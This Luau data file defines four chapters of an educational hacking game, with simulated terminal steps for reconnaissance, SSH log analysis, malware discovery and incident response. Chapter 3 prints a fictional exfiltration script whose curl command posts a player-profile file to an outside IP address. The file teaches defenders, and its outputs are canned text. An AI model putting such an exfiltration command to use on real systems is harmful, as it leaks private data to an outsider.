--[[
    ScenarioData.luau
    All chapter definitions for the CyberGame HackTablet.
]]

local ScenarioData = {}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 1 — Active Reconnaissance
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter1_Recon = {
    type      = "terminal",
    title     = "Chapter 1: Active Reconnaissance",
    objective = "Scan nearby networks, capture packets, and gain access to the Bloxplay network.",
    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║     HACKTABLET v2.4  —  RECONNAISSANCE MODE     ║
║  Objective: Scan networks & capture packets      ║
╚══════════════════════════════════════════════════╝
You are outside Bloxplay HQ. Several WiFi networks
are visible from your position.
Type  help  to see available commands.
]],
    steps = {
        {
            id          = "ch1_help",
            instruction = "Open the command list. Type: help",
            hint        = "Start by checking what tools the tablet already exposes.",
            validCommands = { "help" },
            output      = [[
[*] HackOS SIM commands loaded.
    Key commands for this mission:
      scan [nearby|ip]   — discover devices
      sniff [ip]         — capture packet traffic
      packets [ip]       — open packet analyzer
      connect <ip>       — simulate network access
      ssh <user@ip>      — simulate SSH login
]],
        },
        {
            id          = "ch1_scan",
            instruction = "Scan for nearby devices. Type: scan nearby",
            hint        = "Begin with a reconnaissance command aimed at nearby targets.",
            validCommands = { "scan nearby", "scan" },
            output      = [[
[*] Scan target: nearby (sim)
    Bloxplay_ITWifi    [192.168.32.10]  open:53,67,68,80,443  role:Wireless gateway
    Bloxplay_AdminWifi [192.168.43.2]   open:22,80,443,8080   role:Admin wireless gateway
    Laptop             [192.168.32.12]  open:53,80,443,5151   role:Employee workstation
    PlayerData_Vault   [192.168.43.20]  open:22,80,443,3306   role:Player profile storage
    ...and more
[*] Hint: inspect traffic from the employee workstation next
]],
        },
        {
            id          = "ch1_sniff",
            instruction = "Capture packets from the employee laptop using the sniff tool.",
            hint        = "Follow traffic from the employee workstation, not the gateway.",
            validCommands = { "sniff 192.168.32.12" },
            output      = [[
[*] Sniffing Laptop (192.168.32.12) ... (sim)
[1] HTTP  192.168.32.12 -> 192.168.43.20  dns=playerdata.bloxplay.local  port=80
[2] TCP   192.168.32.12 -> 192.168.43.20  dns=auth.bloxplay.local        port=443
[3] HTTP  192.168.43.20 -> 203.44.18.77   dns=bloxplay.com               port=80
[4] DNS   192.168.32.10 -> 224.0.0.251    dns=admin.bloxplay.local       port=53
[5] HTTPS 192.168.32.12 -> 192.168.43.20  dns=playerdata.bloxplay.local  port=443
[*] Capture complete.
[*] Suspicious outbound traffic to 203.44.18.77 detected.
[*] Credentials observed in HTTP traffic: bloxplay-admin / blox123
]],
        },
        {
            id          = "ch1_packets",
            instruction = "Inspect the packet analyzer for the same workstation.",
            hint        = "Open the packet tool against the same workstation you just investigated.",
            validCommands = { "packets 192.168.32.12" },
            output      = [[
[*] Packet Analyzer: Laptop (192.168.32.12) (sim)
[*] Generated rows: 12
[*] Notable: playerdata.bloxplay.local traffic found
[*] Browser view available: visit RBXPacketNet.com
]],
        },
        {
            id          = "ch1_connect",
            instruction = "Connect to the admin network gateway using the connect command.",
            hint        = "Pivot from reconnaissance into the admin-side gateway.",
            validCommands = { "connect 192.168.43.2" },
            output      = [[
[*] Resolving 192.168.43.2 ... (sim)
[*] Connected to Bloxplay_AdminWifi [192.168.43.2] (sim)
[*] You now have access to the admin network segment.
[*] Next: SSH into the player data vault.
]],
            isLastStep  = true,
        },
    },
}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 2 — SSH Connection and Log Analysis
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter2_SSH = {
    type      = "terminal",
    title     = "Chapter 2: SSH and Log Analysis",
    objective = "Access the PlayerData_Vault server and find evidence of the attacker.",
    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║      HACKTABLET v2.4  —  FORENSICS MODE         ║
║   Objective: Investigate PlayerData_Vault        ║
╚══════════════════════════════════════════════════╝
You found credentials in the packet capture:
  bloxplay-admin / blox123
The PlayerData_Vault sits deeper in the admin-side segment.
]],
    steps = {
        {
            id          = "ch2_ssh",
            instruction = "SSH into the PlayerData_Vault with the credentials you uncovered.",
            hint        = "Use the admin credentials you uncovered against the vault host.",
            validCommands = { "ssh bloxplay-admin@192.168.43.20" },
            output      = [[
[*] ssh: connecting to bloxplay-admin@192.168.43.20 ... (sim)
[*] Using credentials previously observed in traffic capture (sim)
[*] Host key fingerprint verified (sim)
[*] Password accepted (sim)
[*] Welcome bloxplay-admin, connected to PlayerData_Vault
]],
        },
        {
            id          = "ch2_ls",
            instruction = "List files on the server root. Type: ls /",
            hint        = "Take a quick look at the top level of the remote filesystem.",
            validCommands = { "ls /", "ls" },
            output      = [[
[*] Listing / on PlayerData_Vault (sim)
    home  var  etc  srv
    auth.log  report.txt  sync_jobs.sh  player_profiles.db
]],
        },
        {
            id          = "ch2_cat_auth",
            instruction = "Read the authentication log. Type: cat auth.log",
            hint        = "The authentication log is the shortest path to login evidence.",
            validCommands = { "cat auth.log", "cat /auth.log" },
            output      = [[
--- auth.log ---
2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77
2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77
2026-03-24 08:04:08 sshd[1322]: Accepted password for bloxplay-admin from 192.168.32.12
2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77
]],
        },
        {
            id          = "ch2_grep",
            instruction = 'Search for failed logins. Type: grep "Failed login" auth.log',
            hint        = "Search the auth log for unsuccessful sign-ins rather than reading every line manually.",
            validCommands = {
                'grep "failed login" auth.log',
                "grep failed auth.log",
                "grep failed login auth.log",
            },
            output      = [[
[*] Matches for "Failed login" in auth.log:
2026-03-24 08:02:14 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77
2026-03-24 08:02:27 sshd[1203]: Failed login for bloxplay-admin from 203.44.18.77
2026-03-24 08:12:40 sshd[1941]: Failed login for backup from 203.44.18.77
[*] All failed attempts originate from 203.44.18.77
]],
        },
        {
            id          = "ch2_cat_report",
            instruction = "Read the server report. Type: cat report.txt",
            hint        = "Review the short report file that summarizes what the server noticed.",
            validCommands = { "cat report.txt", "cat /report.txt" },
            output      = [[
--- report.txt ---
Server report (SIM)
- outbound traffic spike detected
- investigate running processes
- review netstat output
[*] Attacker IP confirmed: 203.44.18.77
[*] Chapter complete. Proceed to Chapter 3.
]],
            isLastStep  = true,
        },
    },
}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 3 — Malware Discovery and Network Tracing
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter3_Malware = {
    type      = "terminal",
    title     = "Chapter 3: Malware Discovery",
    objective = "Find the malware, identify data exfiltration, and trace the attacker's server.",
    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║      HACKTABLET v2.4  —  MALWARE SCAN MODE      ║
║   Objective: Find & analyze the malware          ║
╚══════════════════════════════════════════════════╝
You are still connected to PlayerData_Vault.
Something is running that should not be here.
]],
    steps = {
        {
            id          = "ch3_psrep",
            instruction = "List running processes. Type: psrep",
            hint        = "Check the process list before touching files or network state.",
            validCommands = { "psrep", "ps aux" },
            output      = [[
PID   NAME                STATUS    HOST=PlayerData_Vault
602   sshd                Running
774   vaultleafd          Running
911   profile-sync        Sleeping
1337  sync_jobs.sh        Running
[*] Finding: PID 1337 looks like WannaWail activity (fictional sim)
]],
        },
        {
            id          = "ch3_phishing",
            instruction = "Analyze the suspicious phishing lure with one of the mail-analysis tools.",
            hint        = "Use a phishing-analysis command on a message that sounds urgent or asks for verification.",
            validCommands = { "baitcheck", "decoymail" },
            requiresPhishingAnalysis = true,
            output      = [[
[*] Phishing analysis (sim)
- Pressure language detected
- Credential harvest risk elevated
- Authority impersonation likely
[*] Finding: the attacker paired WannaWail with a phishing-style lure.
]],
        },
        {
            id          = "ch3_cat_malware",
            instruction = "Read the suspicious script. Type: cat sync_jobs.sh",
            hint        = "Inspect the suspicious shell script directly.",
            validCommands = { "cat sync_jobs.sh", "cat /sync_jobs.sh" },
            output      = [[
--- sync_jobs.sh ---
#!/bin/sh
# WannaWail (fictional) exfil loader
curl -X POST http://203.44.18.77/upload --data-binary @/srv/profiles.csv
[*] This WannaWail loader is sending player profile data to an external server!
[*] C2 server identified: 203.44.18.77
]],
        },
        {
            id          = "ch3_netstat",
            instruction = "Check active network connections. Type: netstat",
            hint        = "Look for which external connection is still alive from the vault.",
            validCommands = { "netstat" },
            output      = [[
[*] Active connections on PlayerData_Vault (sim)
tcp  0  0  192.168.43.20:22   192.168.32.12:49822   ESTABLISHED
tcp  0  0  192.168.43.20:443  203.44.18.77:8080     ESTABLISHED
tcp  0  0  192.168.43.20:3306 192.168.43.25:54011   TIME_WAIT
[*] Finding: suspicious outbound connection to 203.44.18.77
]],
        },
        {
            id          = "ch3_malwarescan",
            instruction = "Run the malware scanner. Type: malwarescan",
            hint        = "Use the built-in scan to confirm what the suspicious script is doing.",
            validCommands = { "malwarescan" },
            output      = [[
[*] Malware scanner on PlayerData_Vault (sim)
[!] Alert: sync_jobs.sh flagged as WannaWail (fictional ransomware-style sample)
[!] IOC: outbound endpoint 203.44.18.77
[*] Recommended actions:
    kill 1337
    rm sync_jobs.sh
    passwd <new strong password>
[*] Chapter complete. Proceed to Chapter 4.
]],
            isLastStep  = true,
        },
    },
}

-- ════════════════════════════════════════════════════════════════════
--  CHAPTER 4 — Incident Response and System Hardening
-- ════════════════════════════════════════════════════════════════════
ScenarioData.Chapter4_IncidentResponse = {
    type      = "terminal",
    title     = "Chapter 4: Incident Response",
    objective = "Stop the attacker, remove the malware, and harden the system.",
    welcomeMessage = [[
╔══════════════════════════════════════════════════╗
║    HACKTABLET v2.4  —  INCIDENT RESPONSE MODE   ║
║   Objective: Stop the attack & secure the system ║
╚══════════════════════════════════════════════════╝
The attacker's script is still running.
You must act fast before more data is exfiltrated.
]],
    steps = {
        {
            id          = "ch4_kill",
            instruction = "Terminate the malicious process. Type: kill 1337",
            hint        = "Stop the suspicious PID before cleaning up anything else.",
            validCommands = { "kill 1337" },
            output      = [[
[*] Terminated PID 1337 (sync_jobs.sh) (sim)
[*] WannaWail activity halted and data exfiltration stopped.
]],
        },
        {
            id          = "ch4_rm",
            instruction = "Remove the exfiltration script. Type: rm sync_jobs.sh",
            hint        = "Delete the malicious script after its process is no longer running.",
            validCommands = { "rm sync_jobs.sh", "rm /sync_jobs.sh" },
            output      = [[
[*] Removed sync_jobs.sh (sim)
[*] WannaWail loader deleted from server.
]],
        },
        {
            id          = "ch4_passwd",
            instruction = "Set a strong new admin password. Type: passwd <new password>\n(Must be 12+ chars, mixed case, numbers, and symbols)",
            hint        = "Rotate the admin password with something long, mixed, and hard to guess.",
            validCommands = {
                "passwd newstr0ng#pass!",
                "passwd str0ngpass#1",
                "passwd bl0xplay#secure!",
                "passwd hackos#2026!",
                "passwd secur3p@ss!",
            },
            requiresStrongPassword = true,
            output      = [[
[*] passwd (sim): password updated successfully
[*] Admin credentials rotated. Attacker's stolen password is now invalid.
]],
        },
        {
            id          = "ch4_malwarescan_verify",
            instruction = "Run a final malware scan to confirm the system is clean. Type: malwarescan",
            hint        = "Verify the cleanup with one final scan.",
            validCommands = { "malwarescan" },
            output      = [[
[*] Malware scanner on PlayerData_Vault (sim)
[*] No malware indicators found.
[*] PID 1337 — terminated.
[*] sync_jobs.sh — removed.
[*] WannaWail - contained.
[*] Credentials - rotated.
[*] System status: SECURED
]],
        },
        {
            id          = "ch4_exit",
            instruction = "Close the SSH session now that the system is secured. Type: exit",
            hint        = "Close the remote session once the host is clean.",
            validCommands = { "exit" },
            output      = [[
[*] Connection to PlayerData_Vault closed.
╔══════════════════════════════════════════════════╗
║              MISSION COMPLETE                    ║
║                                                  ║
║  The attacker was identified:                    ║
║    Origin IP:  203.44.18.77                      ║
|    Method:     SSH brute force + WannaWail load  |
║    Data stolen: /srv/profiles.csv                ║
║                                                  ║
║  System secured:                                 ║
║    ✓ Malware terminated and removed              ║
║    ✓ Credentials rotated                         ║
║    ✓ Incident documented                         ║
╚══════════════════════════════════════════════════╝
]],
            isLastStep  = true,
        },
    },
}

return ScenarioData

